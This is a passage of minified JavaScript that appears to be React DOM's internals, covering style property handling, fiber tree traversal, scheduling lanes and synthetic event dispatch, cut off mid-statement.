Pr={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Ux=["Webkit","ms","Moz","O"];Object.keys(Pr).forEach(function(e){Ux.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),Pr[t]=Pr[e]})});function Og(e,t,n){return t==null||typeof t=="boolean"||t===""?"":n||typeof t!="number"||t===0||Pr.hasOwnProperty(e)&&Pr[e]?(""+t).trim():t+"px"}function Ig(e,t){e=e.style;for(var n in t)if(t.hasOwnProperty(n)){var s=n.indexOf("--")===0,r=Og(n,t[n],s);n==="float"&&(n="cssFloat"),s?e.setProperty(n,r):e[n]=r}}var zx=ne({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function vc(e,t){if(t){if(zx[e]&&(t.children!=null||t.dangerouslySetInnerHTML!=null))throw Error(P(137,e));if(t.dangerouslySetInnerHTML!=null){if(t.children!=null)throw Error(P(60));if(typeof t.dangerouslySetInnerHTML!="object"||!("__html"in t.dangerouslySetInnerHTML))throw Error(P(61))}if(t.style!=null&&typeof t.style!="object")throw Error(P(62))}}function bc(e,t){if(e.indexOf("-")===-1)return typeof t.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var xc=null;function Xu(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var kc=null,js=null,Ms=null;function Wh(e){if(e=Ti(e)){if(typeof kc!="function")throw Error(P(280));var t=e.stateNode;t&&(t=Na(t),kc(e.stateNode,e.type,t))}}function Ng(e){js?Ms?Ms.push(e):Ms=[e]:js=e}function jg(){if(js){var e=js,t=Ms;if(Ms=js=null,Wh(e),t)for(e=0;e<t.length;e++)Wh(t[e])}}function Mg(e,t){return e(t)}function Lg(){}var al=!1;function Dg(e,t,n){if(al)return e(t,n);al=!0;try{return Mg(e,t,n)}finally{al=!1,(js!==null||Ms!==null)&&(Lg(),jg())}}function Qr(e,t){var n=e.stateNode;if(n===null)return null;var s=Na(n);if(s===null)return null;n=s[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(n&&typeof n!="function")throw Error(P(231,t,typeof n));return n}var Sc=!1;if(Qt)try{var ur={};Object.defineProperty(ur,"passive",{get:function(){Sc=!0}}),window.addEventListener("test",ur,ur),window.removeEventListener("test",ur,ur)}catch{Sc=!1}function $x(e,t,n,s,r,i,o,a,l){var c=Array.prototype.slice.call(arguments,3);try{t.apply(n,c)}catch(u){this.onError(u)}}var qr=!1,Bo=null,Vo=!1,Tc=null,Hx={onError:function(e){qr=!0,Bo=e}};function Qx(e,t,n,s,r,i,o,a,l){qr=!1,Bo=null,$x.apply(Hx,arguments)}function Gx(e,t,n,s,r,i,o,a,l){if(Qx.apply(this,arguments),qr){if(qr){var c=Bo;qr=!1,Bo=null}else throw Error(P(198));Vo||(Vo=!0,Tc=c)}}function os(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,t.flags&4098&&(n=t.return),e=t.return;while(e)}return t.tag===3?n:null}function _g(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Uh(e){if(os(e)!==e)throw Error(P(188))}function Kx(e){var t=e.alternate;if(!t){if(t=os(e),t===null)throw Error(P(188));return t!==e?null:e}for(var n=e,s=t;;){var r=n.return;if(r===null)break;var i=r.alternate;if(i===null){if(s=r.return,s!==null){n=s;continue}break}if(r.child===i.child){for(i=r.child;i;){if(i===n)return Uh(r),e;if(i===s)return Uh(r),t;i=i.sibling}throw Error(P(188))}if(n.return!==s.return)n=r,s=i;else{for(var o=!1,a=r.child;a;){if(a===n){o=!0,n=r,s=i;break}if(a===s){o=!0,s=r,n=i;break}a=a.sibling}if(!o){for(a=i.child;a;){if(a===n){o=!0,n=i,s=r;break}if(a===s){o=!0,s=i,n=r;break}a=a.sibling}if(!o)throw Error(P(189))}}if(n.alternate!==s)throw Error(P(190))}if(n.tag!==3)throw Error(P(188));return n.stateNode.current===n?e:t}function Fg(e){return e=Kx(e),e!==null?Bg(e):null}function Bg(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var t=Bg(e);if(t!==null)return t;e=e.sibling}return null}var Vg=Je.unstable_scheduleCallback,zh=Je.unstable_cancelCallback,Yx=Je.unstable_shouldYield,Xx=Je.unstable_requestPaint,ie=Je.unstable_now,Jx=Je.unstable_getCurrentPriorityLevel,Ju=Je.unstable_ImmediatePriority,Wg=Je.unstable_UserBlockingPriority,Wo=Je.unstable_NormalPriority,Zx=Je.unstable_LowPriority,Ug=Je.unstable_IdlePriority,Pa=null,Nt=null;function e0(e){if(Nt&&typeof Nt.onCommitFiberRoot=="function")try{Nt.onCommitFiberRoot(Pa,e,void 0,(e.current.flags&128)===128)}catch{}}var bt=Math.clz32?Math.clz32:s0,t0=Math.log,n0=Math.LN2;function s0(e){return e>>>=0,e===0?32:31-(t0(e)/n0|0)|0}var Ui=64,zi=4194304;function xr(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Uo(e,t){var n=e.pendingLanes;if(n===0)return 0;var s=0,r=e.suspendedLanes,i=e.pingedLanes,o=n&268435455;if(o!==0){var a=o&~r;a!==0?s=xr(a):(i&=o,i!==0&&(s=xr(i)))}else o=n&~r,o!==0?s=xr(o):i!==0&&(s=xr(i));if(s===0)return 0;if(t!==0&&t!==s&&!(t&r)&&(r=s&-s,i=t&-t,r>=i||r===16&&(i&4194240)!==0))return t;if(s&4&&(s|=n&16),t=e.entangledLanes,t!==0)for(e=e.entanglements,t&=s;0<t;)n=31-bt(t),r=1<<n,s|=e[n],t&=~r;return s}function r0(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function i0(e,t){for(var n=e.suspendedLanes,s=e.pingedLanes,r=e.expirationTimes,i=e.pendingLanes;0<i;){var o=31-bt(i),a=1<<o,l=r[o];l===-1?(!(a&n)||a&s)&&(r[o]=r0(a,t)):l<=t&&(e.expiredLanes|=a),i&=~a}}function Cc(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function zg(){var e=Ui;return Ui<<=1,!(Ui&4194240)&&(Ui=64),e}function ll(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function ki(e,t,n){e.pendingLanes|=t,t!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,t=31-bt(t),e[t]=n}function o0(e,t){var n=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<n;){var r=31-bt(n),i=1<<r;t[r]=0,s[r]=-1,e[r]=-1,n&=~i}}function Zu(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var s=31-bt(n),r=1<<s;r&t|e[s]&t&&(e[s]|=t),n&=~r}}var z=0;function $g(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Hg,ed,Qg,Gg,Kg,Ac=!1,$i=[],pn=null,fn=null,mn=null,Gr=new Map,Kr=new Map,an=[],a0="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function $h(e,t){switch(e){case"focusin":case"focusout":pn=null;break;case"dragenter":case"dragleave":fn=null;break;case"mouseover":case"mouseout":mn=null;break;case"pointerover":case"pointerout":Gr.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":Kr.delete(t.pointerId)}}function dr(e,t,n,s,r,i){return e===null||e.nativeEvent!==i?(e={blockedOn:t,domEventName:n,eventSystemFlags:s,nativeEvent:i,targetContainers:[r]},t!==null&&(t=Ti(t),t!==null&&ed(t)),e):(e.eventSystemFlags|=s,t=e.targetContainers,r!==null&&t.indexOf(r)===-1&&t.push(r),e)}function l0(e,t,n,s,r){switch(t){case"focusin":return pn=dr(pn,e,t,n,s,r),!0;case"dragenter":return fn=dr(fn,e,t,n,s,r),!0;case"mouseover":return mn=dr(mn,e,t,n,s,r),!0;case"pointerover":var i=r.pointerId;return Gr.set(i,dr(Gr.get(i)||null,e,t,n,s,r)),!0;case"gotpointercapture":return i=r.pointerId,Kr.set(i,dr(Kr.get(i)||null,e,t,n,s,r)),!0}return!1}function Yg(e){var t=Bn(e.target);if(t!==null){var n=os(t);if(n!==null){if(t=n.tag,t===13){if(t=_g(n),t!==null){e.blockedOn=t,Kg(e.priority,function(){Qg(n)});return}}else if(t===3&&n.stateNode.current.memoizedState.isDehydrated){e.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}e.blockedOn=null}function xo(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var n=Ec(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(n===null){n=e.nativeEvent;var s=new n.constructor(n.type,n);xc=s,n.target.dispatchEvent(s),xc=null}else return t=Ti(n),t!==null&&ed(t),e.blockedOn=n,!1;t.shift()}return!0}function Hh(e,t,n){xo(e)&&n.delete(t)}function c0(){Ac=!1,pn!==null&&xo(pn)&&(pn=null),fn!==null&&xo(fn)&&(fn=null),mn!==null&&xo(mn)&&(mn=null),Gr.forEach(Hh),Kr.forEach(Hh)}function hr(e,t){e.blockedOn===t&&(e.blockedOn=null,Ac||(Ac=!0,Je.unstable_scheduleCallback(Je.unstable_NormalPriority,c0)))}function Yr(e){function t(r){return hr(r,e)}if(0<$i.length){hr($i[0],e);for(var n=1;n<$i.length;n++){var s=$i[n];s.blockedOn===e&&(s.blockedOn=null)}}for(pn!==null&&hr(pn,e),fn!==null&&hr(fn,e),mn!==null&&hr(mn,e),Gr.forEach(t),Kr.forEach(t),n=0;n<an.length;n++)s=an[n],s.blockedOn===e&&(s.blockedOn=null);for(;0<an.length&&(n=an[0],n.blockedOn===null);)Yg(n),n.blockedOn===null&&an.shift()}var Ls=Jt.ReactCurrentBatchConfig,zo=!0;function u0(e,t,n,s){var r=z,i=Ls.transition;Ls.transition=null;try{z=1,td(e,t,n,s)}finally{z=r,Ls.transition=i}}function d0(e,t,n,s){var r=z,i=Ls.transition;Ls.transition=null;try{z=4,td(e,t,n,s)}finally{z=r,Ls.transition=i}}function td(e,t,n,s){if(zo){var r=Ec(e,t,n,s);if(r===null)wl(e,t,s,$o,n),$h(e,s);else if(l0(r,e,t,n,s))s.stopPropagation();else if($h(e,s),t&4&&-1<a0.indexOf(e)){for(;r!==null;){var i=Ti(r);if(i!==null&&Hg(i),i=Ec(e,t,n,s),i===null&&wl(e,t,s,$o,n),i===r)break;r=i}r!==null&&s.stopPropagation()}else wl(e,t,s,null,n)}}var $o=null;function Ec(e,t,n,s){if($o=null,e=Xu(s),e=Bn(e),e!==null)if(t=os(e),t===null)e=null;else if(n=t.tag,n===13){if(e=_g(t),e!==null)return e;e=null}else if(n===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return $o=e,null}function Xg(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Jx()){case Ju:return 1;case Wg:return 4;case Wo:case Zx:return 16;case Ug:return 536870912;default:return 16}default:return 16}}var cn=null,nd=null,ko=null;function Jg(){if(ko)return ko;var e,t=nd,n=t.length,s,r="value"in cn?cn.value:cn.textContent,i=r.length;for(e=0;e<n&&t[e]===r[e];e++);var o=n-e;for(s=1;s<=o&&t[n-s]===r[i-s];s++);return ko=r.slice(e,1<s?1-s:void 0)}function So(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function Hi(){return!0}function Qh(){return!1}function et(e){function t(n,s,r,i,o){this._reactName=n,this._targetInst=r,this.type=s,this.nativeEvent=i,this.target=o,this.currentTarget=null;for(var a in e)e.hasOwnProperty(a)&&(n=e[a],this[a]=n?n(i):i[a]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?Hi:Qh,this.isPropagationStopped=Qh,this}return ne(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=Hi)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=Hi)},persist:function(){},isPersistent:Hi}),t}var tr={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},sd=et(tr),Si=ne({},tr,{view:0,detail:0}),h0=et(Si),cl,ul,pr,qa=ne({},Si,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:rd,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==pr&&(pr&&e.type==="mousemove"?(cl=e.screenX-pr.screenX,ul=e.screenY-pr.screenY):ul=cl=0,pr=e),cl)},movementY:function(e){return"movementY"in e?e.movementY:ul}}),Gh=et(qa),p0=ne({},qa,{dataTransfer:0}),f0=et(p0),m0=ne({},Si,{relatedTarget:0}),dl=et(m0),g0=ne({},tr,{animationName:0,elapsedTime:0,pseudoElement:0}),y0=et(g0),w0=ne({},tr,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),v0=et(w0),b0=ne({},tr,{data:0}),Kh=et(b0),x0={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},k0={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},S0={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function T0(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=S0[e])?!!t[e]:!1}function rd(){return T0}var C0=ne({},Si,{key:function(e){if(e.key){var t=x0[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=So(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?k0[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:rd,charCode:function(e){return e.type==="keypress"?So(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?So(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),A0=et(C0),E0=ne({},qa,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Yh=et(E0),R0=ne({},Si,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:rd}),P0=et(R0),q0=ne({},tr,{propertyName:0,elapsedTime:0,pseudoElement:0}),O0=et(q0),I0=ne({},qa,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),N0=et(I0),j0=[9,13,27,32],id=Qt&&"CompositionEvent"in window,Or=null;Qt&&"documentMode"in document&&(Or=document.documentMode);var M0=Qt&&"TextEvent"in window&&!Or,Zg=Qt&&(!id||Or&&8<Or&&11>=Or),Xh=" ",Jh=!1;function ey(e,t){switch(e){case"keyup":return j0.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function ty(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var ys=!1;function L0(e,t){switch(e){case"compositionend":return ty(t);case"keypress":return t.which!==32?null:(Jh=!0,Xh);case"textInput":return e=t.data,e===Xh&&Jh?null:e;default:return null}}function D0(e,t){if(ys)return e==="compositionend"||!id&&ey(e,t)?(e=Jg(),ko=nd=cn=null,ys=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return Zg&&t.locale!=="ko"?null:t.data;default:return null}}var _0={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Zh(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!_0[e.type]:t==="textarea"}function ny(e,t,n,s){Ng(s),t=Ho(t,"onChange"),0<t.length&&(n=new sd("onChange","change",null,n,s),e.push({event:n,listeners:t}))}var Ir=null,Xr=null;function F0(e){py(e,0)}function Oa(e){var t=bs(e);if(Ag(t))return e}function B0(e,t){if(e==="change")return t}var sy=!1;if(Qt){var hl;if(Qt){var pl="oninput"in document;if(!pl){var ep=document.createElement("div");ep.setAttribute("oninput","return;"),pl=typeof ep.oninput=="function"}hl=pl}else hl=!1;sy=hl&&(!document.documentMode||9<document.documentMode)}function tp(){Ir&&(Ir.detachEvent("onpropertychange",ry),Xr=Ir=null)}function ry(e){if(e.propertyName==="value"&&Oa(Xr)){var t=[];ny(t,Xr,e,Xu(e)),Dg(F0,t)}}function V0(e,t,n){e==="focusin"?(tp(),Ir=t,Xr=n,Ir.attachEvent("onpropertychange",ry)):e==="focusout"&&tp()}function W0(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Oa(Xr)}function U0(e,t){if(e==="click")return Oa(t)}function z0(e,t){if(e==="input"||e==="change")return Oa(t)}function $0(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var kt=typeof Object.is=="function"?Object.is:$0;function Jr(e,t){if(kt(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var n=Object.keys(e),s=Object.keys(t);if(n.length!==s.length)return!1;for(s=0;s<n.length;s++){var r=n[s];if(!cc.call(t,r)||!kt(e[r],t[r]))return!1}return!0}function np(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function sp(e,t){var n=np(e);e=0;for(var s;n;){if(n.nodeType===3){if(s=e+n.textContent.length,e<=t&&s>=t)return{node:n,offset:t-e};e=s}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=np(n)}}function iy(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?iy(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function oy(){for(var e=window,t=Fo();t instanceof e.HTMLIFrameElement;){try{var n=typeof t.contentWindow.location.href=="string"}catch{n=!1}if(n)e=t.contentWindow;else break;t=Fo(e.document)}return t}function od(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}function H0(e){var t=oy(),n=e.focusedElem,s=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&iy(n.ownerDocument.documentElement,n)){if(s!==null&&od(n)){if(t=s.start,e=s.end,e===void 0&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if(e=(t=n.ownerDocument||document)&&t.defaultView||window,e.getSelection){e=e.getSelection();var r=n.textContent.length,i=Math.min(s.start,r);s=s.end===void 0?i:Math.min(s.end,r),!e.extend&&i>s&&(r=s,s=i,i=r),r=sp(n,i);var o=sp(n,s);r&&o&&(e.rangeCount!==1||e.anchorNode!==r.node||e.anchorOffset!==r.offset||e.focusNode!==o.node||e.focusOffset!==o.offset)&&(t=t.createRange(),t.setStart(r.node,r.offset),e.removeAllRanges(),i>s?(e.addRange(t),e.extend(o.node,o.offset)):(t.setEnd(o.node,o.offset),e.addRange(t)))}}for(t=[],e=n;e=e.parentNode;)e.nodeType===1&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<t.length;n++)e=t[n],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Q0=Qt&&"documentMode"in document&&11>=document.documentMode,ws=null,Rc=null,Nr=null,Pc=!1;function rp(e,t,n){var s=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Pc||ws==null||ws!==Fo(s)||(s=ws,"selectionStart"in s&&od(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),Nr&&Jr(Nr,s)||(Nr=s,s=Ho(Rc,"onSelect"),0<s.length&&(t=new sd("onSelect","select",null,t,n),e.push({event:t,listeners:s}),t.target=ws)))}function Qi(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var vs={animationend:Qi("Animation","AnimationEnd"),animationiteration:Qi("Animation","AnimationIteration"),animationstart:Qi("Animation","AnimationStart"),transitionend:Qi("Transition","TransitionEnd")},fl={},ay={};Qt&&(ay=document.createElement("div").style,"AnimationEvent"in window||(delete vs.animationend.animation,delete vs.animationiteration.animation,delete vs.animationstart.animation),"TransitionEvent"in window||delete vs.transitionend.transition);function Ia(e){if(fl[e])return fl[e];if(!vs[e])return e;var t=vs[e],n;for(n in t)if(t.hasOwnProperty(n)&&n in ay)return fl[e]=t[n];return e}var ly=Ia("animationend"),cy=Ia("animationiteration"),uy=Ia("animationstart"),dy=Ia("transitionend"),hy=new Map,ip="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function An(e,t){hy.set(e,t),is(t,[e])}for(var ml=0;ml<ip.length;ml++){var gl=ip[ml],G0=gl.toLowerCase(),K0=gl[0].toUpperCase()+gl.slice(1);An(G0,"on"+K0)}An(ly,"onAnimationEnd");An(cy,"onAnimationIteration");An(uy,"onAnimationStart");An("dblclick","onDoubleClick");An("focusin","onFocus");An("focusout","onBlur");An(dy,"onTransitionEnd");Us("onMouseEnter",["mouseout","mouseover"]);Us("onMouseLeave",["mouseout","mouseover"]);Us("onPointerEnter",["pointerout","pointerover"]);Us("onPointerLeave",["pointerout","pointerover"]);is("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));is("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));is("onBeforeInput",["compositionend","keypress","textInput","paste"]);is("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));is("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));is("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var kr="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Y0=new Set("cancel close invalid load scroll toggle".split(" ").concat(kr));function op(e,t,n){var s=e.type||"unknown-event";e.currentTarget=n,Gx(s,t,void 0,e),e.currentTarget=null}function py(e,t){t=(t&4)!==0;for(var n=0;n<e.length;n++){var s=e[n],r=s.event;s=s.listeners;e:{var i=void 0;if(t)for(var o=s.length-1;0<=o;o--){var a=s[o],l=a.instance,c=a.currentTarget;if(a=a.listener,l!==i&&r.isPropagationStopped())break e;op(r,a,c),i=l}else for(o=0;o<s.length;o++){if(a=s[o],l=a.instance,c=a.currentTarget,a=a.listener,l!==i&&r.isPropagationStopped())break e;op(r,a,c),i=l}}}if(Vo)throw e=Tc,Vo=!1,Tc=null,e}function X(e,t){var n=t[jc];n===void 0&&(n=t[jc]=new Set);var s=e+"__bubble";n.has(s)||(fy(t,e,2,!1),n.add(s))}function yl(e,t,n){var s=0;t&&(s|=4),fy(n,e,s,t)}var Gi="_reactListening"+Math.random().toString(36).slice(2);function Zr(e){if(!e[Gi]){e[Gi]=!0,xg.forEach(function(n){n!=="selectionchange"&&(Y0.has(n)||yl(n,!1,e),yl(n,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[Gi]||(t[Gi]=!0,yl("selectionchange",!1,t))}}function fy(e,t,n,s){switch(Xg(t)){case 1:var r=u0;break;case 4:r=d0;break;default:r=td}n=r.bind(null,t,n,e),r=void 0,!Sc||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(r=!0),s?r!==void 0?e.addEventListener(t,n,{capture:!0,passive:r}):e.addEventListener(t,n,!0):r!==void 0?e.addEventListener(t,n,{passive:r}):e.addEventListener(t,n,!1)}function wl(e,t,n,s,r){var i=s;if(!(t&1)&&!(t&2)&&s!==null)e:for(;;){if(s===null)return;var o=s.tag;if(o===3||o===4){var a=s.stateNode.containerInfo;if(a===r||a.nodeType===8&&a.parentNode===r)break;if(o===4)for(o=s.return;o!==null;){var l=o.tag;if((l===3||l===4)&&(l=o.stateNode.containerInfo,l===r||l.nodeType===8&&l.parentNode===r))return;o=o.return}for(;a!==null;){if(o=Bn(a),o===null)return;if(l=o.tag,l===5||l===6){s=i=o;continue e}a=a.parentNode}}s=s.return}Dg(function(){var c=i,u=Xu(n),d=[];e:{var h=hy.get(e);if(h!==void 0){var m=sd,f=e;switch(e){case"keypress":if(So(n)===0)break 